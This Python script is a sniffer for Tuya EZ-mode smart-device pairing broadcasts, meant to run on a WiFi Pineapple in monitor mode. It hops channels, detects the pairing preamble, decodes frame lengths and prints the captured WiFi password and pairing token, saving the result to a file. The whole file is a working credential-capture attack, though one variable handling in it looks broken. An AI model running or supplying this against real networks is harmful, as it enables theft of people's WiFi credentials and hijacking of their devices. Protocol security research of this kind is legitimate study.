#!/usr/bin/env python3
"""
Tuya EZ Mode (SmartConfig/Tuya Link) pairing sniffer.
Captures WiFi credentials and pairing token from Tuya device pairing broadcasts.

Based on:
- elttam research: https://www.elttam.com/blog/ez-mode-pairing/
- TuyaAPI Link protocol: https://github.com/TuyaAPI/link

Run on the Pineapple with wlan1mon in monitor mode.
Usage: python3 tuya_ez_sniffer.py wlan1mon
"""
import sys
import struct
import time
from collections import defaultdict

try:
    from scapy.all import *
except ImportError:
    print("scapy not available, install with: pip3 install scapy")
    sys.exit(1)

IFACE = sys.argv[1] if len(sys.argv) > 1 else "wlan1mon"

PREAMBLE = [1, 3, 6, 10]
HEAD_LEN = 2
DATA_OFFSET = 49

found_preamble = False
src_mac = None
data_lengths = []
raw_packets = []
capture_start = None
decoded_data = {}

def decode_tuya_link(lengths):
    """Decode Tuya Link encoded data from packet lengths."""
    data = bytearray()
    i = 0
    while i < len(lengths):
        val = lengths[i] - DATA_OFFSET
        if val < 0 or val > 255:
            i += 1
            continue
        data.append(val)
        i += 1
    return data

def check_preamble(length_sequence):
    """Check if we see the Tuya EZ mode preamble pattern."""
    if len(length_sequence) < len(PREAMBLE):
        return False
    offsets = [l - DATA_OFFSET for l in length_sequence[-len(PREAMBLE):]]
    return offsets == PREAMBLE

def packet_handler(pkt):
    global found_preamble, src_mac, data_lengths, capture_start
    
    if not pkt.haslayer(Dot11):
        return
    
    if pkt.type != 2:
        return
    
    if not pkt.addr1 or pkt.addr1.lower() != "ff:ff:ff:ff:ff:ff":
        return
    
    frame_len = len(pkt)
    
    if not found_preamble:
        data_lengths.append(frame_len)
        if len(data_lengths) > 100:
            data_lengths = data_lengths[-50:]
        
        if check_preamble(data_lengths):
            found_preamble = True
            src_mac = pkt.addr2
            capture_start = time.time()
            data_lengths = []
            print(f"\n[!] PREAMBLE DETECTED from {src_mac}")
            print(f"[*] Capturing EZ mode pairing data...")
    else:
        if pkt.addr2 and pkt.addr2.lower() == src_mac.lower():
            data_lengths.append(frame_len)
            raw_packets.append(frame_len)
            
            elapsed = time.time() - capture_start
            sys.stdout.write(f"\r[*] Captured {len(data_lengths)} data packets ({elapsed:.1f}s)")
            sys.stdout.flush()
            
            if len(data_lengths) > 200 or elapsed > 15:
                print(f"\n\n[+] Capture complete. Decoding...")
                decoded = decode_tuya_link(data_lengths)
                
                print(f"\n[+] Raw decoded ({len(decoded)} bytes):")
                print(f"    Hex: {decoded.hex()}")
                try:
                    text = decoded.decode('utf-8', errors='replace')
                    print(f"    Text: {text}")
                except:
                    pass
                
                if len(decoded) > 10:
                    try:
                        passwd_len = decoded[0]
                        token_len = decoded[1] if len(decoded) > 1 else 0
                        
                        offset = HEAD_LEN
                        if passwd_len > 0 and offset + passwd_len <= len(decoded):
                            password = decoded[offset:offset+passwd_len]
                            print(f"\n[+] WiFi Password ({passwd_len} bytes): {password.decode('utf-8', errors='replace')}")
                            offset += passwd_len
                        
                        if token_len > 0 and offset + token_len <= len(decoded):
                            region = decoded[offset:offset+2]
                            token = decoded[offset+2:offset+2+token_len-2]
                            print(f"[+] Region: {region.decode('utf-8', errors='replace')}")
                            print(f"[+] Pairing Token: {token.decode('utf-8', errors='replace')}")
                            offset += token_len
                        
                        if offset < len(decoded):
                            remaining = decoded[offset:]
                            print(f"[+] Remaining data: {remaining.hex()}")
                            print(f"    As text: {remaining.decode('utf-8', errors='replace')}")
                    except Exception as e:
                        print(f"[-] Decode error: {e}")
                
                with open('/tmp/tuya_ez_capture.json', 'w') as f:
                    import json
                    json.dump({
                        'src_mac': src_mac,
                        'raw_lengths': raw_packets,
                        'decoded_hex': decoded.hex(),
                        'timestamp': time.time(),
                    }, f, indent=2)
                print(f"\n[+] Saved capture to /tmp/tuya_ez_capture.json")
                
                found_preamble = False
                src_mac = None
                data_lengths = []
                raw_packets = []
                print(f"\n[*] Listening for next pairing attempt...")


def channel_hop(iface, channels=[1,2,3,4,5,6,7,8,9,10,11]):
    """Hop through WiFi channels to find EZ mode pairing."""
    import subprocess, threading
    idx = 0
    while True:
        ch = channels[idx % len(channels)]
        subprocess.run(['iw', 'dev', iface, 'set', 'channel', str(ch)], 
                      capture_output=True)
        idx += 1
        time.sleep(0.5)


if __name__ == "__main__":
    print("=" * 60)
    print("TUYA EZ MODE PAIRING SNIFFER")
    print("=" * 60)
    print(f"Interface: {IFACE}")
    print(f"Listening for Tuya SmartConfig/EZ mode broadcasts...")
    print(f"Pair a Tuya device NOW using the Tuya Smart app.")
    print(f"Press Ctrl+C to stop.\n")
    
    import threading
    hopper = threading.Thread(target=channel_hop, args=(IFACE,), daemon=True)
    hopper.start()
    
    try:
        sniff(iface=IFACE, prn=packet_handler, store=0)
    except KeyboardInterrupt:
        print("\n\nStopped.")
